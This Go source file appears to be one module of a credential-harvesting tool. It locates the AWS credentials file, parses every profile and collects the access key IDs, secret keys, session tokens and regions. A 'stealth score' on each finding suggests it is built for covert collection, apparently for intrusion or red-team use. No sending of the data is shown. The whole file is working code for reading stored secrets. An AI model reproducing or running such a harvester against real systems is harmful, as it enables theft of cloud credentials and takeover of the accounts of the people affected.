package aws

import (
	"bufio"
	"fmt"
	"os"
	"strings"

	"github.com/ninken/ninloader-go/internal/collector"
	"github.com/ninken/ninloader-go/internal/platform"
	"github.com/ninken/ninloader-go/internal/registry"
	"github.com/ninken/ninloader-go/internal/types"
)

func init() {
	registry.Register("aws", "credentials", func() collector.Collector {
		return &CredentialsCollector{BaseCollector: collector.BaseCollector{Svc: "aws", Src: "credentials"}}
	})
}

// CredentialsCollector parses ~/.aws/credentials for AWS access keys.
type CredentialsCollector struct {
	collector.BaseCollector
}

func (c *CredentialsCollector) Service() string      { return c.Svc }
func (c *CredentialsCollector) Source() string        { return c.Src }
func (c *CredentialsCollector) StealthScore() int     { return 5 }
func (c *CredentialsCollector) Platforms() []string   { return nil }
func (c *CredentialsCollector) IsPlatformSupported() bool { return true }

func (c *CredentialsCollector) credentialsPath() string {
	return platform.AWSDir() + string(os.PathSeparator) + "credentials"
}

// parseINI reads an INI file and returns a map of section -> key -> value.
func parseINI(path string) (map[string]map[string]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	sections := make(map[string]map[string]string)
	currentSection := ""

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())

		// Skip empty lines and comments
		if line == "" || strings.HasPrefix(line, "#") || strings.HasPrefix(line, ";") {
			continue
		}

		// Section header
		if strings.HasPrefix(line, "[") && strings.HasSuffix(line, "]") {
			currentSection = strings.TrimSpace(line[1 : len(line)-1])
			if _, ok := sections[currentSection]; !ok {
				sections[currentSection] = make(map[string]string)
			}
			continue
		}

		// Key = value pair
		if currentSection != "" {
			if idx := strings.IndexByte(line, '='); idx >= 0 {
				key := strings.TrimSpace(line[:idx])
				val := strings.TrimSpace(line[idx+1:])
				sections[currentSection][key] = val
			}
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return sections, nil
}

func (c *CredentialsCollector) Discover() []*types.DiscoveredToken {
	path := c.credentialsPath()
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return nil
	}

	sections, err := parseINI(path)
	if err != nil {
		c.Warn(fmt.Sprintf("Failed to parse %s: %v", path, err))
		return nil
	}

	var results []*types.DiscoveredToken
	for section, kv := range sections {
		keyID, ok := kv["aws_access_key_id"]
		if !ok || keyID == "" {
			continue
		}

		hint := keyID
		if len(hint) > 8 {
			hint = hint[:8]
		}

		results = append(results, &types.DiscoveredToken{
			Service:      c.Svc,
			Source:       c.Src,
			Path:         path,
			AccountHint:  fmt.Sprintf("profile:%s", section),
			StealthScore: c.StealthScore(),
			Details:      fmt.Sprintf("key_id=%s...", hint),
		})
	}

	return results
}

func (c *CredentialsCollector) Collect() []*types.CollectedToken {
	path := c.credentialsPath()
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return nil
	}

	sections, err := parseINI(path)
	if err != nil {
		c.Warn(fmt.Sprintf("Failed to collect from %s: %v", path, err))
		return nil
	}

	var results []*types.CollectedToken
	for section, kv := range sections {
		keyID := kv["aws_access_key_id"]
		secret := kv["aws_secret_access_key"]

		if keyID == "" || secret == "" {
			continue
		}

		tok := types.NewCollectedToken(c.Svc, c.Src, c.StealthScore())
		tok.AccountID = keyID
		tok.Username = fmt.Sprintf("profile:%s", section)
		tok.AccessToken = types.Secure(keyID)
		tok.ClientSecret = types.Secure(secret)

		tok.Extra["profile"] = section

		if session := kv["aws_session_token"]; session != "" {
			tok.Extra["session_token"] = session
		}

		if region := kv["region"]; region != "" {
			tok.Extra["region"] = region
		}

		results = append(results, tok)
	}

	return results
}
